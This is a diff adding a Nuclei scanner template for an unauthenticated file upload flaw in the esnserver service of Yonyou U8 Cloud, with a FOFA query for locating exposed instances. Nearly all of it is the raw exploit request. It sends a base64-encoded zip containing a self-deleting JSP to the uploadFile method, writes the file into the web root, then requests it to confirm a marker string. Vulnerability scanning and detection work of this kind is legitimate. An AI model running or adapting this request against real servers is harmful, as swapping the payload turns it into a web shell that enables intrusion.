@@ -1,0 +1,43 @@
+id: yonyou-u8-cloud-esnserver-fileupload
+info:
+  name: 用友 U8 Cloud esnserver - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/xX7FBCqf0PzkV9WIVzK8Hg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: 2024,yonyou,oa,u8cloud,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /service/esnserver HTTP/1.1 
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0 
+        Accept-Encoding: gzip, deflate 
+        Content-Type: application/x-www-form-urlencoded 
+        Token: 469ce01522f64366750d1995ca119841 
+        Content-Length: 583 
+        
+        {"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBBQAAAAAAPR5NFm2C9sJVgAAAFYAAAAKAAAAY29tcHJlc3NlZDwlbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPjEyMzEyUEsBAhQAFAAAAAAA9Hk0WbYL2wlWAAAAVgAAAAoAAAAAAAAAAAAAALaBAAAAAGNvbXByZXNzZWRQSwUGAAAAAAEAAQA4AAAAfgAAAAAA","p2":"webapps/u8c_web/{{filename}}.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}
+      
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200  && status_code_2 == 200
+          - contains(body_1,'成功')
+          - contains(body_2,'12312')
+        condition: and
